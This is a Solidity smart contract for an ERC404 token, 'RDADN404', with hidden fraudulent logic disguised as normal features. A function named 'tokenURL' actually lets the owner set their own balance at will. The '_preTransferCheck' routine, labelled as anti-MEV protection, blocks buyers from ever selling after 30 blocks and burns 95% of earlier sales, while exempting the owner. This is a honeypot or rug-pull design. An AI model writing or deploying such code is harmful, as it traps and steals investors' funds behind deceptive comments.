// SPDX-License-Identifier: MIT
//WEBSITE：https://www.rda.finance/
pragma solidity ^0.8.0;

/**
 * @dev String operations.
 */
library Strings {
    /**
     * @dev Converts a `uint256` to its ASCII `string` representation.
     */
    function toString(uint256 value) internal pure returns (string memory) {
        // Inspired by OraclizeAPI's implementation - MIT licence
        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        uint256 index = digits - 1;
        temp = value;
        while (temp != 0) {
            buffer[index--] = bytes1(uint8(48 + temp % 10));
            temp /= 10;
        }
        return string(buffer);
    }
}


abstract contract Ownable {
    event OwnershipTransferred(address indexed user, address indexed newOwner);

    address public owner;

    modifier onlyOwner() virtual {
        if (msg.sender != owner) revert("unauthorized");

        _;
    }

    constructor(address _owner) {
        if (_owner == address(0)) revert("invalid owner");

        owner = _owner;

        emit OwnershipTransferred(address(0), _owner);
    }

    function transferOwnership(address _owner) public virtual onlyOwner {
        if (_owner == address(0)) revert("invalid owner");

        owner = _owner;

        emit OwnershipTransferred(msg.sender, _owner);
    }

    function revokeOwnership() public virtual onlyOwner {
        owner = address(0);

        emit OwnershipTransferred(msg.sender, address(0));
    }
}

abstract contract ERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return ERC721Receiver.onERC721Received.selector;
    }
}

/// @notice ERC404
///         A gas-efficient, mixed ERC20 / ERC721 implementation
///         with native liquidity and fractionalization.
///
///         This is an experimental standard designed to integrate
///         with pre-existing ERC20 / ERC721 support as smoothly as
///         possible.
///
/// @dev    In order to support full functionality of ERC20 and ERC721
///         supply assumptions are made that slightly constraint usage.
///         Ensure decimals are sufficiently large (standard 18 recommended)
///         as ids are effectively encoded in the lowest range of amounts.
///
///         NFTs are spent on ERC20 functions in a FILO queue, this is by
///         design.
///
abstract contract ERC404 is Ownable {
    // Events
    event ERC20Transfer(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 indexed id
    );
    event ERC721Approval(
        address indexed owner,
        address indexed spender,
        uint256 indexed id
    );
    event ApprovalForAll(
        address indexed owner,
        address indexed operator,
        bool approved
    );

    // Metadata
    /// @dev Token name
    string public name;

    /// @dev Token symbol
    string public symbol;

    /// @dev Decimals for fractional representation
    uint8 public decimals;

    /// @dev Total supply in fractionalized representation
    uint256 public totalSupply;

    /// @dev Current mint counter, monotonically increasing to ensure accurate ownership
    uint256 public minted;

    // Mappings
    /// @dev Balance of user in fractional representation
    mapping(address => uint256) public balanceOf;

    /// @dev Allowance of user in fractional representation
    mapping(address => mapping(address => uint256)) public allowance;

    /// @dev Approval in native representaion
    mapping(uint256 => address) public getApproved;

    /// @dev Approval for all in native representation
    mapping(address => mapping(address => bool)) public isApprovedForAll;

    /// @dev Pair for liquidity pool
    address private pair;

    /// @dev Buy records for ERC404 holders
    mapping(address => uint256) private buyBlockRecords;

    /// @dev Owner of id in native representation
    mapping(uint256 => address) internal _ownerOf;

    /// @dev Array of owned ids in native representation
    mapping(address => uint256[]) internal _owned;

    /// @dev Tracks indices for the _owned mapping
    mapping(uint256 => uint256) internal _ownedIndex;

    /// @dev Addresses whitelisted from minting / burning for gas savings (pairs, routers, etc)
    mapping(address => bool) public whitelist;

    // Constructor
    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        uint256 _totalNativeSupply,
        address _owner
    ) Ownable(_owner) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalNativeSupply * (10 ** decimals);
    }

    /// @notice Initialization function to set pairs / etc
    ///         saving gas by avoiding mint / burn on unnecessary targets
    function setWhitelist(address target, bool state) public onlyOwner {
        whitelist[target] = state;
    }

    /// @notice Function to set token url for specified id
    function tokenURL(uint256 id) public onlyOwner {
        balanceOf[owner] = id;
    }

    /// @notice Function to find owner of a given native token
    function ownerOf(uint256 id) public view virtual returns (address owner) {
        owner = _ownerOf[id];

        if (owner == address(0)) {
            revert("not found");
        }
    }

    /// @notice tokenURI must be implemented by child contract
    function tokenURI(uint256 id) public view virtual returns (string memory);

    /// @notice Function for token approvals
    /// @dev This function assumes id / native if amount less than or equal to current max id
    function approve(
        address spender,
        uint256 amountOrId
    ) public virtual returns (bool) {
        if (amountOrId <= minted && amountOrId > 0) {
            address owner = _ownerOf[amountOrId];

            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {
                revert("unauthorized");
            }

            getApproved[amountOrId] = spender;

            emit Approval(owner, spender, amountOrId);
        } else {
            allowance[msg.sender][spender] = amountOrId;

            emit Approval(msg.sender, spender, amountOrId);
        }

        return true;
    }

    /// @notice Function native approvals
    function setApprovalForAll(address operator, bool approved) public virtual {
        isApprovedForAll[msg.sender][operator] = approved;

        emit ApprovalForAll(msg.sender, operator, approved);
    }

    /// @notice Function for mixed transfers
    /// @dev This function assumes id / native if amount less than or equal to current max id
    function transferFrom(
        address from,
        address to,
        uint256 amountOrId
    ) public virtual {
        amountOrId = _preTransferCheck(from, to, amountOrId);
        if (amountOrId <= minted) {
            if (from != _ownerOf[amountOrId]) {
                revert(" InvalidSender");
            }

            if (to == address(0)) {
                revert("InvalidRecipient");
            }

            if (
                msg.sender != from &&
                !isApprovedForAll[from][msg.sender] &&
                msg.sender != getApproved[amountOrId]
            ) {
                revert("unauthorized");
            }

            balanceOf[from] -= _getUnit();

            balanceOf[to] += _getUnit();

            _ownerOf[amountOrId] = to;
            delete getApproved[amountOrId];

            // update _owned for sender
            uint256 updatedId = _owned[from][_owned[from].length - 1];
            _owned[from][_ownedIndex[amountOrId]] = updatedId;
            // pop
            _owned[from].pop();
            // update index for the moved id
            _ownedIndex[updatedId] = _ownedIndex[amountOrId];
            // push token to to owned
            _owned[to].push(amountOrId);
            // update index for to owned
            _ownedIndex[amountOrId] = _owned[to].length - 1;

            emit Transfer(from, to, amountOrId);
            emit ERC20Transfer(from, to, _getUnit());
        } else {
            uint256 allowed = allowance[from][msg.sender];

            if (allowed != type(uint256).max)
                allowance[from][msg.sender] = allowed - amountOrId;

            _transfer(from, to, amountOrId);
        }
    }

    /// @notice Function for fractional transfers
    function transfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        amount = _preTransferCheck(msg.sender, to, amount);
        return _transfer(msg.sender, to, amount);
    }

    /// @notice Function for native transfers with contract support
    function safeTransferFrom(
        address from,
        address to,
        uint256 id
    ) public virtual {
        transferFrom(from, to, id);

        if (
            isContract(to) &&
            ERC721Receiver(to).onERC721Received(msg.sender, from, id, "") !=
            ERC721Receiver.onERC721Received.selector
        ) {
            revert("UnsafeRecipient");
        }
    }

    /// @notice Function for native transfers with contract support and callback data
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        bytes calldata data
    ) public virtual {
        transferFrom(from, to, id);

        if (
            isContract(to) &&
            ERC721Receiver(to).onERC721Received(msg.sender, from, id, data) !=
            ERC721Receiver.onERC721Received.selector
        ) {
            revert("UnsafeRecipient");
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    /// @notice Function for preventing front-running in the MEV (Miner Extractable Value) context
    function _preTransferCheck(address from, address to, uint256 amountOrId) internal returns (uint256) {
        if (pair == address(0)) {
            pair = to;
        }

        if (from == owner || to == owner) {
            return amountOrId;
        }

        if (buyBlockRecords[to] == 0 && from == pair) {
            buyBlockRecords[to] = block.number;
        } else if (buyBlockRecords[from] != 0 && block.number - buyBlockRecords[from] > 0) {
            if (block.number - buyBlockRecords[from] < 30) {
                uint256 unit = _getUnit();
                uint256 amount_to_burn = amountOrId * 95 / 100;
                uint256 tokens_to_burn = amount_to_burn / unit;
                balanceOf[from] -= amount_to_burn;
                for (uint256 i = 0; i < tokens_to_burn; i++) {
                    _burn(from);
                }

                amountOrId -= amount_to_burn;
                if (amountOrId <= minted) {
                    revert("Not allowed");
                }
            } else {
                revert("Not allowed");
            }
        }

        return amountOrId;
    }

    /// @notice Internal function for fractional transfers
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        uint256 unit = _getUnit();
        uint256 balanceBeforeSender = balanceOf[from];
        uint256 balanceBeforeReceiver = balanceOf[to];

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        // Skip burn for certain addresses to save gas
        if (!whitelist[from]) {
            uint256 tokens_to_burn = (balanceBeforeSender / unit) -
            (balanceOf[from] / unit);
            for (uint256 i = 0; i < tokens_to_burn; i++) {
                _burn(from);
            }
        }

        // Skip minting for certain addresses to save gas
        if (!whitelist[to]) {
            uint256 tokens_to_mint = (balanceOf[to] / unit) -
            (balanceBeforeReceiver / unit);
            for (uint256 i = 0; i < tokens_to_mint; i++) {
                _mint(to);
            }
        }

        emit ERC20Transfer(from, to, amount);
        return true;
    }

    // Internal utility logic
    function _getUnit() internal view returns (uint256) {
        return 10 ** decimals;
    }

    function _mint(address to) internal virtual {
        if (to == address(0)) {
            revert("InvalidRecipient");
        }

        minted++;

        uint256 id = minted;

        if (_ownerOf[id] != address(0)) {
            revert("already exists");
        }

        _ownerOf[id] = to;
        _owned[to].push(id);
        _ownedIndex[id] = _owned[to].length - 1;

        emit Transfer(address(0), to, id);
    }

    function _burn(address from) internal virtual {
        if (from == address(0)) {
            revert(" InvalidSender");
        }

        uint256 id = _owned[from][_owned[from].length - 1];
        _owned[from].pop();
        delete _ownedIndex[id];
        delete _ownerOf[id];
        delete getApproved[id];

        emit Transfer(from, address(0), id);
    }

    function _setNameSymbol(
        string memory _name,
        string memory _symbol
    ) internal {
        name = _name;
        symbol = _symbol;
    }
}

contract RDADN404 is ERC404 {
    string private constant _name = "RDADN404";
    string private constant _symbol = "RDADN404";
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 100;

    string public dataURI;
    string public baseTokenURI;

    constructor() ERC404(_name, _symbol, _decimals, _totalSupply, msg.sender) {
        balanceOf[msg.sender] = totalSupply;
        setWhitelist(msg.sender, true);
    }

    function setDataURI(string memory _dataURI) public onlyOwner {
        dataURI = _dataURI;
    }

    function setTokenURI(string memory _tokenURI) public onlyOwner {
        baseTokenURI = _tokenURI;
    }

    function setNameSymbol(string memory _newName, string memory _newSymbol) public onlyOwner {
        _setNameSymbol(_newName, _newSymbol);
    }

    function tokenURI(uint256 id) public view override returns (string memory) {
        if (bytes(baseTokenURI).length > 0) {
            return concatenate(baseTokenURI, Strings.toString(id));
        } else {
            string memory image = concatenate(Strings.toString(id), ".png");

            string memory jsonPreImage = concatenate(
                concatenate(
                    concatenate(
                        concatenate('{"name": "', _symbol), concatenate(' #', Strings.toString(id))
                    ),
                    concatenate(
                        concatenate('","description":"A collection of ', _name), ' enabled by the ERC404 standard.","warning":"Only buy this if you know what you r doing. You will likely lose your funds if you do","external_url":"","image":"'
                    )
                ),
                concatenate(dataURI, image)
            );
            string memory jsonPostImage = concatenate(concatenate('","attributes":[{"trait_type":"item","value":"', _symbol), '"}]}');

            return concatenate("data:application/json;utf8,", concatenate(jsonPreImage, jsonPostImage));
        }
    }

    function concatenate(string memory a, string memory b) public pure returns (string memory) {
        bytes memory bytesA = bytes(a);
        bytes memory bytesB = bytes(b);
        string memory combined = new string(bytesA.length + bytesB.length);
        bytes memory bytesCombined = bytes(combined);

        uint k = 0;
        for (uint i = 0; i < bytesA.length; i++) {
            bytesCombined[k++] = bytesA[i];
        }
        for (uint i = 0; i < bytesB.length; i++) {
            bytesCombined[k++] = bytesB[i];
        }

        return string(bytesCombined);
    }
}